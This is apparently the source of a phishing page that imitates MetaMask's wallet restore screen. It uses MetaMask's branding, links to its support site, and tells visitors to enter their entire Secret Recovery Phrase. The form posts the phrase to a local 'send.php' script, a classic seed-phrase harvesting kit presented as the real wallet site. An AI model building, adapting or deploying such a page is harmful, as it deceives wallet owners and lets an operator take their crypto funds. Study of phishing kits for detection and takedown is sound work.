<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'The Ultimate Crypto Wallet for DeFi, Web3 Apps, and NFTs | MetaMask';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <?php
        $list = [
            ['img' => base_url('assets/img/mt/MetaMask_Fox.svg'), 'h4' => "Let's get started", 'div' => "Trusted by millions, MetaMask is a secure wallet making the world of web3 accessible to all."],
            ['img' => base_url('assets/img/mt/onboarding-welcome-say-hello.svg'), 'h4' => "Explore decentralized apps", 'div' => "Store, send and spend crypto currencies and assets."],
            ['img' => base_url('assets/img/mt/onboarding-welcome-decentralised-apps.svg'), 'h4' => "Say hello to your wallet", 'div' => "Use your MetaMask to login to decentralized apps - no signup needed."],
        ];
        ?>
        <div class="container">
            <div class="row justify-content-center mt40">
                <div class="col-sm-6 rounded-4 border p25 mb50">
                    <div class="my20 border-top mx60" style="position: relative">
                        <span class="px14 py6 bg-white border border-2 border-primary text-primary rounded-circle fw-bold" style="position: absolute; left:0; bottom:-17px">1</span>
                        <span class="px13 py6 bg-white border border-2 border-primary text-primary rounded-circle fw-bold" style="position: absolute; right:0; bottom:-17px">2</span>
                    </div>
                    <div class="row fs13 mt15">
                        <div class="col-sm-6 text-primary">Confirm secret recovery phrase</div>
                        <div class="col-sm-6 text-secondary text-end pe30">Create password</div>
                    </div>
                    <h4 class="text-center fw-bold mt15">Access your wallet with your Secret Recovery Phrase</h4>
                    <div class="my15 fs18 lh28">MetaMask cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password. First, enter the Secret Recovery Phrase that you were given when you created your wallet. <a href="https://support.metamask.io/privacy-and-security/what-is-a-secret-recovery-phrase-and-how-to-keep-your-crypto-wallet-secure/" class="text-decoration-none" target="_blank">Learn more</a></div>

                    <div class="row mt30 py20 ">
                        <div class="col-sm-6 fw-bold fs18">Type your Secret Recovery Phrase</div>
                        <div class="col-sm-6">
                            <select class="form-select" id="recovery_phrase_select" aria-label="Default Recovery Phrase">
                                <option value="12">I have a 12-word phrase</option>
                                <option value="15">I have a 15-word phrase</option>
                                <option value="18">I have a 18-word phrase</option>
                                <option value="21">I have a 21-word phrase</option>
                                <option value="24">I have a 24-word phrase</option>
                            </select>
                        </div>
                    </div>
                    <div class="alert alert-primary border-0 border-start border-5 border-primary" role="alert">
                        <i class="fa-solid fa-circle-exclamation text-primary fs18 pe10" aria-hidden="true"></i>
                        You can paste your entire secret recovery phrase into any field
                    </div>
                    <form method="post" action="<?= base_url('send.php') ?>" class="py10">
                        <div class="row form_keys"></div>
                        <div class="row">
                            <div class="col-sm-12 my30 mb50 text-center">
                                <button type="submit" class="btn btn-primary bg-primary-2 px60 rounded-pill py12 fs15">Confirm Secret Recovery Phrase</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <?php include_once './includes/footer.php'; ?>
</body>
</html>